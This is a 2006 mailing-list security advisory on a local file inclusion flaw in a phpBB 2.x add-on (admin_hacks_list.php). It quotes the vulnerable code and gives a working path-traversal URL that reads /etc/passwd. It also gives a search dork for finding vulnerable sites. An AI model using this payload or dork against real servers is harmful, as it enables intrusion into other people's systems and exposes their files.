
Date: Sun, 28 May 2006 17:04:08 +0300
From: Mustafa Can Bjorn IPEKCI <nukedx@...edx.com>
To: submit@...w0rm.com, full-disclosure@...ts.grok.org.uk,
	bugtraq@...urityfocus.com, support@...isec.com
Subject: Advisory: phpBB 2.x (admin/admin_hacks_list.php)
	Local Inclusion Vulnerability.


--Security Report--
Advisory: phpBB 2.x (admin/admin_hacks_list.php) Local Inclusion  
Vulnerability.
---
Author: Mustafa Can Bjorn "nukedx a.k.a nuker" IPEKCI
---
Date: 27/05/06 07:37 PM
---
Contacts:{
ICQ: 10072
MSN/Email: nukedx@...edx.com
Web: http://www.nukedx.com
}
---
Vendor: Nivisec (http://www.nivisec.com/)
Version: 2.x and prior versions must be affected.
About: Via this methods remote attacker can include arbitrary local  
files to phpBB.board_config[default_lang] and phpEx variable in
admin/admin_hacks_list.php did not sanitized properl before using  
it.You can find vulnerable code in admin_hacks_list.php at lines
30-37
-Source in admin_hacks_list.php-
30: if( !empty($setmodules) )
31: {
32:    include($phpbb_root_path . 'language/lang_' .  
$board_config['default_lang'] . '/lang_admin_hacks_list.' . $phpEx);
33:    $filename = basename(__FILE__);
34:    $module['General']['Hacks_List'] = $filename;
35:
36:    return;
37: }
-End of source-
Level: Highly Critical
---
How&Example:
Succesful exploitation register_globals on
GET ->  
http://[victim]/[phpBB]/admin/admin_hacks_list.php?setmodules=1&board_config[default_lang]=english&phpEx=[FILE]
EXAMPLE ->  
http://[victim]/[phpBB]/admin/admin_hacks_list.php?setmodules=1&board_config[default_lang]=english
&phpEx=../../../../../../../../etc/passwd
---
Timeline:
* 27/05/2006: Vulnerability found.
* 27/05/2006: Contacted with vendor and waiting reply.
---
Exploit: http://www.nukedx.com/?getxpl=37
---
Original advisory can be found at: http://www.nukedx.com/?viewdoc=37
---
Dorks: "Powered by phpBB" inurl:hacks_list.php


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/


